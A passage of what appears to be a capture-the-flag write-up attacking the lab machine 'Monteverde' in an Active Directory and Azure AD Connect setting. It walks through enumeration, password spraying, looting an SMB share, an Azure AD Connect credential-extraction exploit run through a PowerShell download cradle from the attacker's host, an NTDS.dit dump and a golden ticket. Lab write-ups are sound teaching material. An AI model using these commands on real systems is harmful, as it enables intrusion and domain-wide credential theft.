            <button class="copy-button" state="copy" data="kali%20in%20~/Desktop/WindowsTools%20%f0%9f%90%8d%20v3.12.6%20%202GiB/15GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%f0%9f%95%99%2011:25:54%20zsh%20%e2%9d%af%20python3%20ldapchecker.py%20$box%0aAttempting%20to%20connect%20to%2010.129.228.111%20with%20SSL...%0aFailed%20to%20connect%20with%20SSL.%20Retrying%20without%20SSL...%0aConnected%20successfully.%20Retrieving%20server%20information...%0aDSA%20info%20%28from%20DSE%29:%0a%20%20Supported%20LDAP%20versions:%203,%202%0a%20%20Naming%20contexts:%0a%20%20%20%20DC=MEGABANK,DC=LOCAL%0a%20%20%20%20CN=Configuration,DC=MEGABANK,DC=LOCAL%0a%20%20%20%20CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL%0a%20%20%20%20DC=DomainDnsZones,DC=MEGABANK,DC=LOCAL%0a%20%20%20%20DC=ForestDnsZones,DC=MEGABANK,DC=LOCAL">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in ~/Desktop/WindowsTools üêç v3.12.6  2GiB/15GiB | 0B/1GiB with /usr/bin/zsh
</span></span><span style="display:flex;"><span>üïô 11:25:54 zsh ‚ùØ python3 ldapchecker.py $box
</span></span><span style="display:flex;"><span>Attempting to connect to 10.129.228.111 with SSL...
</span></span><span style="display:flex;"><span>Failed to connect with SSL. Retrying without SSL...
</span></span><span style="display:flex;"><span>Connected successfully. Retrieving server information...
</span></span><span style="display:flex;"><span>DSA info <span style="color:#f92672">(</span>from DSE<span style="color:#f92672">)</span>:
</span></span><span style="display:flex;"><span>  Supported LDAP versions: 3, <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>  Naming contexts:
</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>MEGABANK,DC<span style="color:#f92672">=</span>LOCAL
</span></span><span style="display:flex;"><span>    CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>MEGABANK,DC<span style="color:#f92672">=</span>LOCAL
</span></span><span style="display:flex;"><span>    CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>MEGABANK,DC<span style="color:#f92672">=</span>LOCAL
</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>DomainDnsZones,DC<span style="color:#f92672">=</span>MEGABANK,DC<span style="color:#f92672">=</span>LOCAL
</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>ForestDnsZones,DC<span style="color:#f92672">=</span>MEGABANK,DC<span style="color:#f92672">=</span>LOCAL</span></span></code></pre></div>
    
</div>
</li>
<li>
<p><!-- raw HTML omitted -->We have the domain functionaility level<!-- raw HTML omitted -->:</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="#ZgotmplZ">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Other:
</span></span><span style="display:flex;"><span>  domainFunctionality:
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span>  forestFunctionality:
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span>  domainControllerFunctionality:
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span>  rootDomainNamingContext:
</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>MEGABANK,DC<span style="color:#f92672">=</span>LOCAL
</span></span><span style="display:flex;"><span>  ldapServiceName:
</span></span><span style="display:flex;"><span>    MEGABANK.LOCAL:monteverde$@MEGABANK.LOCAL</span></span></code></pre></div>
    
</div>
<ul>
<li>The functionality level determines the minimum version of Windows server that can be used for a DC.
<ul>
<li>
<p>+Note+: that any host os can be used on <strong>workstations</strong>, however the functionality level determines what the minimum version for DC&rsquo;s and the forest.</p>
</li>
<li>
<p><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels">https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels</a></p>
</li>
<li>
<p>Knowing the function level is useful as if want to target the DC&rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.</p>
</li>
<li>
<p>In this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.</p>
</li>
<li>
<p>Here‚Äôs a list of functional level numbers and their corresponding Windows Server operating systems:</p>
<table>
  <thead>
      <tr>
          <th style="text-align: left">Functional Level Number</th>
          <th style="text-align: left">Corresponding OS</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">0</td>
          <td style="text-align: left">Windows 2000</td>
      </tr>
      <tr>
          <td style="text-align: left">1</td>
          <td style="text-align: left">Windows Server 2003 Interim</td>
      </tr>
      <tr>
          <td style="text-align: left">2</td>
          <td style="text-align: left">Windows Server 2003</td>
      </tr>
      <tr>
          <td style="text-align: left">3</td>
          <td style="text-align: left">Windows Server 2008</td>
      </tr>
      <tr>
          <td style="text-align: left">4</td>
          <td style="text-align: left">Windows Server 2008 R2</td>
      </tr>
      <tr>
          <td style="text-align: left">5</td>
          <td style="text-align: left">Windows Server 2012</td>
      </tr>
      <tr>
          <td style="text-align: left">6</td>
          <td style="text-align: left">Windows Server 2012 R2</td>
      </tr>
      <tr>
          <td style="text-align: left">7</td>
          <td style="text-align: left">Windows Server 2016</td>
      </tr>
      <tr>
          <td style="text-align: left">8</td>
          <td style="text-align: left">Windows Server 2019</td>
      </tr>
      <tr>
          <td style="text-align: left">9</td>
          <td style="text-align: left">Windows Server 2022</td>
      </tr>
  </tbody>
</table>
<ul>
<li>+Note+:
<ul>
<li>Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.</li>
<li>As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><!-- raw HTML omitted -->We have the full server name<!-- raw HTML omitted -->:</p>
<ul>
<li>Again we can see this has the CN as the base (mentioned previously.) So it appears it&rsquo;s a printer server site of some sort. What is also interesting is the CN name &ldquo;Configuration&rdquo;, this could imply that it is still to be configured. Which is interesting as things that are still being configured may not have had thorough security standards actioned.







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="#ZgotmplZ">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>serverName:
</span></span><span style="display:flex;"><span>    CN<span style="color:#f92672">=</span>MONTEVERDE,CN<span style="color:#f92672">=</span>Servers,CN<span style="color:#f92672">=</span>Default-First-Site-Name,CN<span style="color:#f92672">=</span>Sites,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>MEGABANK,DC<span style="color:#f92672">=</span>LOCAL</span></span></code></pre></div>
    
</div>
</li>
</ul>
</li>
</ol>
</li>
<li>
<p>It&rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.</p>
<ul>
<li>We have the naming context.</li>
<li>Domain name.</li>
</ul>
</li>
<li>
<p><strong>I update my <code>/etc/hosts</code> file now that we have the server name</strong>.</p>
<ul>
<li>This is so we can use tools like <a href="https://github.com/ropnop/kerbrute">kerbrute</a> for user enumeration as well as other tools later on.</li>
</ul>
</li>
</ul>
<h4 id="ldap-user-enumeration">LDAP User Enumeration:</h4>
<ul>
<li>
<p><strong>As anonymous bind is enabled we can enumerate all the users on the domain also</strong>:</p>
<ul>
<li><code>ldapsearch -H ldap://monteverde.MEGABANK.LOCAL -x -b &quot;DC=MEGABANK,DC=LOCAL&quot; -s sub &quot;(&amp;(objectclass=user))&quot; | grep sAMAccountName: | cut -f2 -d&quot; &quot; &gt;&gt; ldapUsers.txt</code></li>
<li><figure><img src="/ox-hugo/2024-10-13-115134_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>Discoveries</strong>:</p>
<ul>
<li>Looking at the file we can see it&rsquo;s a small list of users, but most noticeably there are also a series of services running which is interesting. However we can confirm this is an Azure Active Directory environment as there is a user called: <code>AAD_987d7f2f57d2</code>
<ul>
<li>Azure AD often uses unique object identifiers like <code>AAD_987d7f2f57d2</code> to represent accounts or resources internally.</li>
</ul>
</li>
<li><figure><img src="/ox-hugo/2024-10-13-115430_.png">
</figure>
</li>
<li>I add all the users to my users list.</li>
</ul>
</li>
</ul>
<h4 id="ldap-group-enumeration">LDAP Group Enumeration:</h4>
<ul>
<li>
<p><strong>We can also enumerate the groups on the domain</strong>:</p>
<ul>
<li><code>ldapsearch -H ldap://monteverde.MEGABANK.LOCAL -x -b &quot;DC=MEGABANK,DC=LOCAL&quot; -s sub &quot;(&amp;(objectclass=group))&quot; | grep sAMAccountName: | cut -f2 -d&quot; &quot; &gt;&gt; ldapGroups.txt</code></li>
<li><figure><img src="/ox-hugo/2024-10-13-115302_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>Discoveries</strong>:</p>
<ul>
<li>Looking at the list of groups there are some interesting standout groups here:
<ul>
<li><figure><img src="/ox-hugo/2024-10-13-115619_.png">
</figure>
</li>
<li>SQLServer2005SQLBrowserUser$MONTEVERDE
<ul>
<li>This is interesting as it does not appear the SQL service is running publicly on a port.</li>
</ul>
</li>
<li>Azure
<ul>
<li>This could be part of an azure environment which could be interesting.</li>
</ul>
</li>
<li>Reception</li>
<li>Operations</li>
<li>Trading</li>
<li>HelpDesk</li>
<li>Developers</li>
</ul>
</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li><strong>We can also generate a list of users who are members of specific groups too</strong>:
<ul>
<li><code>for group in $(cat ldapGroups.txt); do ldapsearch -H ldap://monteverde.MEGABANK.LOCAL -x -b &quot;DC=MEGABANK,DC=LOCAL&quot; -s sub &quot;(&amp;(objectCategory=Person)(sAMAccountName=*)(memberOf=CN=$group,OU=Groups,DC=MEGABANK,DC=LOCAL))&quot; &gt;&gt; ldapGroupMemberships.txt; done</code></li>
<li><figure><img src="/ox-hugo/2024-10-13-115406_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h3 id="dns-53">DNS <code>53</code>:</h3>
<ul>
<li><strong>Using dnsenum to enumerate DNS entries</strong>:
<ul>
<li><code>dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain</code></li>
<li><figure><img src="/ox-hugo/2024-10-13-131201_.png">
</figure>
</li>
<li>Standard entries for an AD env.</li>
</ul>
</li>
</ul>
<h3 id="kerberos-88">Kerberos <code>88</code>:</h3>
<h4 id="using-kerbrute-to-bruteforce-usernames">Using <a href="https://github.com/ropnop/kerbrute">Kerbrute</a> to bruteforce Usernames:</h4>
<ul>
<li>As kerberos is present we can enumerate users using <a href="https://github.com/ropnop/kerbrute">kerbrute</a>:
<ul>
<li><code>kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt</code></li>
</ul>
</li>
<li><figure><img src="/ox-hugo/2024-10-13-120053_.png">
</figure>
</li>
<li>We have some usernames, these were all found using LDAP, however this is still good to have.</li>
</ul>
<h3 id="smb-445">SMB <code>445</code>:</h3>
<h4 id="attempting-to-connect-with-null-and-guest-sessions">Attempting to connect with NULL &amp; Guest sessions:</h4>
<ul>
<li><strong>This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold</strong>:
<ul>
<li><code>netexec smb $box -u 'guest' -p '' --shares</code></li>
<li><code>netexec smb $box -u '' -p '' --shares</code></li>
<li><figure><img src="/ox-hugo/2024-10-13-121259_.png">
</figure>
</li>
</ul>
</li>
<li>Guest account is disabled and null sessions are not allowed it appears.</li>
</ul>
<h4 id="trying-usernames-as-passwords">Trying Usernames as Passwords:</h4>
<ul>
<li><strong>I always try usernames as passwords as well</strong>:
<ul>
<li><code>netexec smb $box -u Users.txt -p Users.txt --shares --continue-on-success | grep [+]</code></li>
<li><figure><img src="/ox-hugo/2024-10-13-121723_.png">
</figure>
</li>
<li>It appears that <code>SABatchJobs</code> is using their username as a password, naught naughty.</li>
</ul>
</li>
</ul>
<h2 id="2-dot-foothold">2. Foothold:</h2>
<h3 id="enumerating-the-domain-sabatchjobs">Enumerating the Domain <code>SABatchJobs</code>:</h3>
<h4 id="running-a-bloodhound-collection">Running a bloodhound collection:</h4>
<ul>
<li><strong>As we have creds now we can run a remote bloodhound collection</strong>:
<ul>
<li><code>python3 bloodhound.py -dc monteverde.$domain -c All -u $user -p $user -d $domain -ns $box</code></li>
<li><figure><img src="/ox-hugo/2024-10-13-123402_.png">
</figure>
</li>
<li>+Note+: The reason this keeps going and I do not check it initially is as it was running the collection I continued to manually enumerate.</li>
</ul>
</li>
</ul>
<h4 id="enumerating-smb-shares">Enumerating <code>SMB</code> Shares:</h4>
<ul>
<li><strong>Listing the shares we can see some interesting entries</strong>:
<ul>
<li><code>netexec smb $box -u $user -p $user --shares</code></li>
<li><figure><img src="/ox-hugo/2024-10-13-122221_.png">
</figure>
</li>
<li>The <code>azure_uploads</code> &amp; <code>users$</code> is particularly interesting.</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li><strong>I check the</strong> <code>azure_uploads</code> <strong>directory but it is empty</strong>:
<ul>
<li><code>smbclient -U $domain\\$user \\\\$box\\azure_uploads</code></li>
<li><figure><img src="/ox-hugo/2024-10-13-125020_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h4 id="finding-azure-dot-xml-in-the-user-mhope-s-user-share">Finding <code>azure.xml</code> in the user <code>mhope</code>&rsquo;s user share:</h4>
<ul>
<li><strong>Enumerating the</strong> <code>users$</code> <strong>shares I find a file called</strong> <code>azure.xml</code> <strong>in the user&rsquo;s</strong> <code>mhope</code> <strong>directory</strong>:
<ul>
<li><code>smbclient -U $domain\\$user \\\\$box\\users$</code></li>
<li><figure><img src="/ox-hugo/2024-10-13-125250_.png">
</figure>
</li>
<li>I download it:
<ul>
<li><figure><img src="/ox-hugo/2024-10-13-125458_.png">
</figure>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="finding-a-hard-coded-password-in-azure-dot-xml">Finding a hard-coded password in <code>azure.xml</code>:</h3>
<ul>
<li><strong>Reading the</strong> <code>azure.xml</code> <strong>file I find a hard-coded password within it</strong>:
<ul>
<li><figure><img src="/ox-hugo/2024-10-13-125600_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h3 id="discovering-that-mhope-re-uses-passwords">Discovering that <code>mhope</code> re-uses passwords:</h3>
<ul>
<li><strong>I check the password for re-use and it appears that</strong> <code>mhope</code> <strong>re-uses passwords</strong>:
<ul>
<li><code>netexec smb $box -u $user -p $pass --shares</code></li>
<li><figure><img src="/ox-hugo/2024-10-13-130331_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h3 id="connecting-to-the-host-as-mhope">Connecting to the host as <code>mhope</code>:</h3>
<ul>
<li><strong>I connect using</strong> <code>evil-winrm</code>:
<ul>
<li><code>evil-winrm -i $box -u $user -p $pass</code></li>
<li><figure><img src="/ox-hugo/2024-10-13-131028_.png">
</figure>
</li>
<li>After some general enumeration I elect to check bloodhound to see if we have any obvious privilege escalation paths.</li>
</ul>
</li>
</ul>
<h2 id="3-dot-privilege-escalation">3. Privilege Escalation:</h2>
<h3 id="discovering-mhope-is-part-of-the-azure-admins-group">Discovering <code>mhope</code> is part of the <code>azure admins</code> group:</h3>
<ul>
<li>
<p><strong>Checking bloodhound I can see that mhope is a part of the</strong> <code>azure admins</code> <strong>group</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-13-131334_.png">
</figure>
</li>
</ul>
</li>
<li>
<p>I quickly check for Azure Admin privilege escalation path on google and find the following article:</p>
<ul>
<li><a href="https://blog.xpnsec.com/azuread-connect-for-redteam/">https://blog.xpnsec.com/azuread-connect-for-redteam/</a></li>
<li>So we need to find out if Azure Connect is running before this is a viable privilege escalation path.</li>
</ul>
</li>
</ul>
<h3 id="enumerating-the-azure-service">Enumerating the Azure Service:</h3>
<h4 id="checking-azure-connect-directory-exists-and-the-service-is-running">Checking Azure Connect Directory Exists &amp; The Service Is Running:</h4>
<ul>
<li>
<p><strong>I check if Azure connect AD Sync directory exists</strong>:</p>
<ul>
<li><code>Test-Path &quot;C:\Program Files\Microsoft Azure AD Sync&quot;</code></li>
<li><figure><img src="/ox-hugo/2024-10-14-092223_.png">
</figure>
</li>
<li>True, so this could work. Lets enumerate further.</li>
</ul>
</li>
<li>
<p><strong>Let&rsquo;s check if the AD Sync binary is installed</strong>:</p>
<ul>
<li><code>Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ADSync -Name &quot;ImagePath&quot;</code></li>
<li><figure><img src="/ox-hugo/2024-10-14-092605_.png">
</figure>
</li>
<li>So it&rsquo;s running, good.</li>
</ul>
</li>
</ul>
<h4 id="checking-for-the-adsync-database">Checking for the <code>ADSync</code> Database:</h4>
<ul>
<li><strong>From reading the article, we can see that</strong> <code>LocalDB</code> <strong>should be running on a default installation</strong>:
<ul>
<li>
<p>It says:</p>
<blockquote>
<p>Now by default when deploying the connector a new database is created on the host using SQL Server‚Äôs LOCALDB. To view information on the running instance, we can use the installed SqlLocalDB.exe tool:
&lt;SNIP&gt;
So what are the requirements to complete this exfiltration of credentials? Well we will need to have access to the LocalDB (if configured to use this DB)</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<h4 id="what-is-sql-server-express-localdb">What is SQL Server Express <code>LocalDB</code>?</h4>
<ul>
<li><strong>Overview of</strong> <code>LocalDB</code>:
<ul>
<li>LocalDB is a lightweight version of SQL Server Express designed for developers to quickly and easily create and test SQL Server databases without the overhead of a full SQL Server installation.</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Key Features of <code>LocalDB</code>:</p>
<ul>
<li><strong>Developer-focused</strong>: It‚Äôs intended for development and local testing purposes, providing a simple and fast setup for SQL Server database instances.</li>
<li><strong>On-demand</strong>: LocalDB runs on-demand, meaning it starts up when an application tries to connect and shuts down when not in use, minimizing resource usage.</li>
<li><strong>User-level instance</strong>: LocalDB runs under the user‚Äôs context, without requiring admin privileges to manage or install.</li>
<li><strong>No configuration needed</strong>: Unlike a full SQL Server instance, LocalDB doesn&rsquo;t require setup or configuration‚Äîit&rsquo;s essentially plug-and-play.</li>
<li><strong>SQL Server API compatibility</strong>: LocalDB supports the same T-SQL commands and APIs as the full version of SQL Server, so code written against LocalDB will work with any edition of SQL Server.</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Use Cases of <code>LocalDB</code>:</p>
<ul>
<li><strong>Development environment</strong>: Ideal for developers needing a local SQL Server database without complex configuration or high resource use.</li>
<li><strong>Testing and debugging</strong>: Developers can create, test, and debug SQL Server applications in a contained environment before deploying to a full SQL Server instance.</li>
<li><strong>Unit testing</strong>: Allows database-related unit testing to be performed locally and quickly.</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Core Characteristics of <code>LocalDB</code>:</p>
<ul>
<li>
<p><strong>Instance Type</strong>:</p>
<ul>
<li>LocalDB runs as a user-mode process, meaning it&rsquo;s user-specific and does not require a system-wide installation of SQL Server.</li>
<li>Each user on a machine can have their own instances of LocalDB.</li>
</ul>
</li>
<li>
<p><strong>Communication via Named Pipes</strong>:</p>
<ul>
<li>Unlike full SQL Server instances that communicate via TCP/IP ports, LocalDB uses named pipes for connections, ensuring simplicity and security for local communication.</li>
</ul>
</li>
<li>
<p><strong>No Service Required</strong>:</p>
<ul>
<li>LocalDB does not run as a Windows service. It is an on-demand process that starts and stops as needed when an application makes a connection.</li>
</ul>
</li>
<li>
<p><strong>Supports Multiple Instances</strong>:</p>
<ul>
<li>You can run multiple LocalDB instances, such as the default instance (MSSQLLocalDB) or custom-named instances. Each instance is independent and isolated from others.</li>
</ul>
</li>
<li>
<p><strong>Further reading</strong>:</p>
<ul>
<li><a href="https://learn.microsoft.com/en-us/sql/tools/sqlLocalDB-utility?view=sql-server-ver16">https://learn.microsoft.com/en-us/sql/tools/sqlLocalDB-utility?view=sql-server-ver16</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="looking-for-localdb-binary">Looking for <code>LocalDB</code> binary:</h4>
<ul>
<li>
<p><strong>Looking online I find</strong> <a href="https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/sql-server-express-LocalDB?view=sql-server-ver16">this article</a> <strong>which says where the</strong> <code>SqlLocalDB.exe</code> <strong>should be found</strong>:</p>
<ul>
<li><code>&quot;C:\Program Files\Microsoft SQL Server\160\Tools\Binn\SqlLocalDB.exe&quot;</code></li>
<li><figure><img src="/ox-hugo/2024-10-14-111153_.png">
</figure>
</li>
<li>Not found.</li>
</ul>
</li>
<li>
<p><strong>Searching for</strong> <code>SqlLocalDB.exe</code></p>
<ul>
<li>Looking at the folder structure of:
<ul>
<li><code>&quot;C:\Program Files\Microsoft SQL Server&quot;</code></li>
<li><figure><img src="/ox-hugo/2024-10-14-111302_.png">
</figure>
</li>
<li>I can see that there is no <code>160</code> folder.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Looking online, I find</strong> <a href="https://stackoverflow.com/questions/36157191/sql-server-how-to-find-all-LocalDB-instance-names#36157192">this post</a> <strong>on StackOverflow</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-14-120119_.png">
</figure>
</li>
<li>It says we should be able to find the binary in either <code>&quot;C:\Program Files\Microsoft SQL Server\110\Tools\Binn</code> or  <code>&quot;C:\Program Files\Microsoft SQL Server\120\Tools\Binn</code></li>
<li>As there is no <code>120</code> on our host I check <code>110</code></li>
</ul>
</li>
</ul>
<h4 id="finding-sqlcmd-dot-exe-in-110">Finding <code>SQLCMD.EXE</code> in 110:</h4>
<ul>
<li>
<p><strong>I check</strong> <code>110</code> <strong>&amp; can see that there is no</strong> <code>SqlLocalDB.exe</code> <strong>but there is a</strong> <code>SQLCMD.EXE</code> <strong>executable</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-14-120844_.png">
</figure>
</li>
<li>I check the other folders <code>140, 150, 80</code> &amp; <code>90</code> but there is nothing of interest.</li>
<li><code>SQLCMD.EXE</code> is used for interacting with local/remote SQL instances.</li>
</ul>
</li>
<li>
<p><strong>We did not see SQL running in our</strong> <code>NMAP</code> <strong>scans, so should check if it&rsquo;s running internally</strong>:</p>
<ul>
<li><code>netstat -ano | findstr :1433</code></li>
<li><figure><img src="/ox-hugo/2024-10-14-092511_.png">
</figure>
</li>
<li>Okay, looks to be running internally, which means this is a non-standard installation of Azure AD Connect that isn&rsquo;t using <code>LocalDB</code>, so it must be running <code>SQL</code>.</li>
</ul>
</li>
</ul>
<h3 id="connecting-to-the-sql-instance">Connecting to the <code>SQL</code> Instance:</h3>
<ul>
<li><strong>I check if we can run commands on the</strong> <code>SQL</code> <strong>Instance</strong>:
<ul>
<li><code>sqlcmd -S MONTEVERDE -Q &quot;SELECT name FROM master.dbo.sysdatabases&quot;</code></li>
<li><figure><img src="/ox-hugo/2024-10-14-124549_.png">
</figure>
</li>
<li>We can &amp; I can see that the <code>ADSync</code> database is present!</li>
</ul>
</li>
</ul>
<h2 id="4-dot-ownership">4. Ownership:</h2>
<h3 id="modifying-xpn-s-poc-to-work">Modifying XPN&rsquo;s POC to work:</h3>
<ul>
<li>
<p><strong>Looking at the POC on XPN&rsquo;s page we can see the opening line says</strong>:</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="$client%20=%20new-object%20System.Data.SqlClient.SqlConnection%20-ArgumentList%20%22Data%20Source=%28localdb%29%5c.%5cADSync;Initial%20Catalog=ADSync%22">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList <span style="color:#e6db74">&#34;Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync&#34;</span></span></span></code></pre></div>
    
</div>
<ul>
<li><a href="https://blog.xpnsec.com/azuread-connect-for-redteam/">https://blog.xpnsec.com/azuread-connect-for-redteam/</a></li>
</ul>
</li>
<li>
<p><strong>However this instance is not using <code>localdb</code> so we need to modify this</strong>:</p>
<ul>
<li><code>Data Source=(localdb)\.\ADSync</code>: Uses <code>localdb</code>, a lightweight version of SQL Server primarily meant for developers (which is not running).</li>
<li>The <code>(localdb)\.\ADSync</code> points to a specific instance of <code>LocalDB</code>.</li>
<li><code>Initial Catalog=ADSync</code>: Specifies the database <code>ADSync</code> that we want to connect to.</li>
</ul>
</li>
<li>
<p><strong>Updated Version</strong>:</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="%20%20%20%20$client%20=%20new-object%20System.Data.SqlClient.SqlConnection%20-ArgumentList%20%22Server=127.0.0.1;Database=ADSync;Integrated%20Security=True%22">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>    $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList <span style="color:#e6db74">&#34;Server=127.0.0.1;Database=ADSync;Integrated Security=True&#34;</span></span></span></code></pre></div>
    
</div>
<ul>
<li><code>Server=127.0.0.1</code>: Uses the local machine&rsquo;s loopback address (<code>127.0.0.1</code>) to connect to the SQL Server instance.
<ul>
<li>As we know that SQL is running internally.</li>
</ul>
</li>
<li><code>Integrated Security=True</code>: This enables Windows Authentication, using the current user&rsquo;s credentials to authenticate with the SQL Server.
<ul>
<li>As we know <code>mhope</code> has the required permissions to connect to the instance:</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>I actually did a deep dive into how this whole attack works, you can find it here</strong>:</p>
<ul>
<li><a href="https://bloodstiller.com/articles/azureadconnect/">https://bloodstiller.com/articles/azureadconnect/</a></li>
</ul>
</li>
</ul>
<h3 id="running-the-exploit-to-extract-the-administrator-password">Running the Exploit to Extract the Administrator Password:</h3>
<ul>
<li>
<p><strong>I start my python webserver</strong>:</p>
<ul>
<li><code>python3 -h http.server 9000</code></li>
</ul>
</li>
<li>
<p><strong>I use a download cradle to run the exploit</strong>:</p>
<ul>
<li><code>iex(new-object net.webclient).downloadstring('http://10.10.14.46:9000/AdConnectPOC.ps1')</code></li>
<li><figure><img src="/ox-hugo/2024-10-14-131101_.png">
</figure>
</li>
<li>We get the administrators password.</li>
</ul>
</li>
<li>
<p><strong>I verify the password works using netexec</strong>:</p>
<ul>
<li><code>netexec smb $box -u $user -p $pass --shares</code></li>
<li><figure><img src="/ox-hugo/2024-10-14-131529_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>Let&rsquo;s grab our</strong> <code>root</code> <strong>flag too</strong>.</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-14-142516_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h2 id="5-dot-persistence">5. Persistence:</h2>
<h3 id="dumping-ntds-dot-dit">Dumping <code>NTDS.dit</code>:</h3>
<ul>
<li><strong>I use netexec to dump the</strong> <code>NTDS.dit</code>:
<ul>
<li><code>netexec smb $box -u $user -p $pass -M ntdsutil</code></li>
<li><figure><img src="/ox-hugo/2024-10-14-133224_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h3 id="creating-a-golden-ticket">Creating a Golden Ticket:</h3>
<ol>
<li>
<p><strong>Using</strong> <code>impacket-lookupsid</code> <strong>to extract the domain</strong> <code>SID</code>:</p>
<ul>
<li><code>impacket-lookupsid $domain/administrator@$box -domain-sids</code></li>
<li><figure><img src="/ox-hugo/2024-10-14-133649_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I use</strong> <code>impacket-ticketer</code> <strong>to create the ticket</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-14-135546_.png">
</figure>
</li>
<li>It kicks out a bunch of errors but creates the <code>administrator.ccache</code></li>
</ul>
</li>
<li>
<p><strong>I load the ticket into the</strong> <code>KRB5CCNAME</code> <strong>Variable</strong>:</p>
<ul>
<li><code>export KRB5CCNAME=./administrator.ccache</code></li>
<li><figure><img src="/ox-hugo/2024-10-14-135651_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I sync my clock with the target</strong>:</p>
<ul>
<li><code>sudo ntpdate -s monteverde.$domain</code></li>
<li><figure><img src="/ox-hugo/2024-10-14-140010_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I connect using</strong> <code>impacket-psexec</code>:</p>
<ul>
<li><code>impacket-psexec monteverde.$domain -k</code></li>
<li><figure><img src="/ox-hugo/2024-10-14-135821_.png">
</figure>
</li>
</ul>
</li>
</ol>
<h2 id="lessons-learned">Lessons Learned:</h2>
<h3 id="what-did-i-learn">What did I learn?</h3>
<ol>
<li>I learned ALOT about Azure AD Connect. I would not have been able to do this without the post from <code>xpn</code>:
<ul>
